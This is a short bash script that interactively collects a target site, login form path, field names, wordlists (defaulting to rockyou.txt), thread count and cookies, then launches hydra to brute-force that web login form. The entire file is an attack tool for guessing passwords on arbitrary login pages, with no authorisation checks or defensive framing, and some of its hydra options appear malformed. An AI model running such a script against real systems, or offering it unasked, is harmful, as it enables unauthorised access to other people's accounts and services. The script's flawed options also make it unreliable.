#!/bin/bash

read -p "Enter target website URL or IP: " target
read -p "Enter target protocol (default: http-post-form): " protocol
protocol=${protocol:-http-post-form}

read -p "Enter form path (e.g., /login.php): " form_path
read -p "Enter username variable (default: username): " username_var
username_var=${username_var:-username}
read -p "Enter password variable (default: password): " password_var
password_var=${password_var:-password}

read -p "Enter path to username wordlist (default: /usr/share/wordlists/rockyou.txt): " userlist
userlist=${userlist:-/usr/share/wordlists/rockyou.txt}
read -p "Enter path to password wordlist (default: /usr/share/wordlists/rockyou.txt): " passlist
passlist=${passlist:-/usr/share/wordlists/rockyou.txt}

read -p "Enter number of threads to use (default: 16): " threads
threads=${threads:-16}
read -p "Enter delay time in seconds (default: 30): " delay
delay=${delay:-30}

read -p "Enter additional form data (e.g., 'remember_me=true&submit=Login'): " form_data

read -p "Enter path to cookies file: " cookies_file

if [ -f "$cookies_file" ]; then
    cookies=$(cat "$cookies_file")
else
    echo "Error: cookies file not found or not readable."
    exit 1
fi

hydra "$target" "$protocol" "$form_path:$username_var=^USER^&$password_var=^PASS^:$form_data" -L "$userlist" -P "$passlist" -t "$threads" -w "$delay" -H "$cookies"
